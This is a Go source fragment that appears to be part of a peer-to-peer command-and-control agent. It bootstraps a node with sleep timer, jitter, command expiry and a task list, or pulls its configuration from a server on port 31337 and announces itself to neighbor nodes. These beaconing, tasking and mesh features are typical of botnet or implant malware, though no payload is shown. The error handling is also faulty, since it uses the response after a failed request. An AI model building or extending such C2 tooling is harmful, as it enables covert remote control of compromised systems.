package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/google/uuid"
)

var configuration Config
var neighborSearchTimeout bool
var neighborSearchTimeoutExpiration time.Time
var completedTasks map[string]Command

// https://stackoverflow.com/questions/35809252/check-if-flag-was-provided-in-go
func confirmServerValueProvided() bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "server" {
			found = true
		}
	})
	return found
}

// If no server is provided create a baseline configuration and wait for more nodes to connect and establish web.
func bootstrapSelf() {
	var e error
	neighborSearchTimeout = true
	configuration.Neighbors[0] = ""
	configuration.Neighbors[1] = ""
	configuration.Neighbors[2] = ""
	configuration.CommandEOL = 900
	configuration.SleepTimer = 10
	configuration.JitterValue = 2
	configuration.LastUpdate = time.Now()
	configuration.Identifier, e = uuid.NewRandom()
	configuration.KnownNodes = make(map[string]uuid.UUID)
	configuration.TaskList = make(map[string]Command)
	completedTasks = make(map[string]Command)
	fmt.Println(configuration)
	if e != nil {
		panic(e)
	}
}

func deployInitialConfiguration() {
	neighborSearchTimeout = true
	pullURL := "http://" + server + ":31337/api/pull"
	resp, err := http.Get(pullURL)
	if err != nil {
		checkNeighbors()
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		panic("meowdy")
	}
	json.Unmarshal(body, &configuration)

	configuration.Neighbors[0] = server
	configuration.Identifier, _ = uuid.NewRandom()
	completedTasks = make(map[string]Command)
	broadcastUUID()
	fmt.Print(configuration)
}
